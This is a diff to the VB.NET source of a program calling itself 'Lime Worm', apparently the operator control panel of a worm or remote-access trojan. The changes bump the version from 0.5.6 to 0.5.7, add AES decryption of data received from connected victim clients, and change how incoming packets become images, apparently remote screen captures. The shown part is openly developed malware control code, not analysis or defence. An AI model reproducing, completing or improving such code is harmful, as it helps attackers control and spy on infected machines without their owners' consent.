@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##        N Y A N   C A T  |||   Updated on May./04/2018        ##
+'##        N Y A N   C A T  |||   Updated on May./05/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -19,7 +19,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                     .. Lime Worm v0.5.6 ..                   ##
+'##                     .. Lime Worm v0.5.7 ..                   ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -107,7 +107,7 @@ Public Class Form1
 
     Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
 
-        Me.Text = "Lime Worm v0.5.6"
+        Me.Text = "Lime Worm v0.5.7"
 
         If ToolStripStatusLabel2.Text.Contains("OFF") Then
             ToolStripStatusLabel2.ForeColor = Color.Red
@@ -152,7 +152,7 @@ Public Class Form1
     Private Shared _Gio As New GIO(Application.StartupPath & "\GIO.dat")
     Delegate Sub _Data(ByVal u As USER, ByVal b() As Byte)
     Private Sub S_Data(ByVal u As USER, ByVal b() As Byte) Handles S.Data
-        Dim A As String() = Split(BS(b), SPL)
+        Dim A As String() = Split(AES_Decrypt(BS(b)), SPL)
 
         Try
             Select Case A(0)
@@ -235,8 +235,7 @@ Public Class Form1
                             End If
                             Exit Sub
                         End If
-                        Dim BB As Byte() = fx(b, "@" & SPL)(1)
-                        Cap.PktToImage(BB)
+                        Cap.PktToImage(SB(A(1)))
                     End If
 
                 Case "MSG"
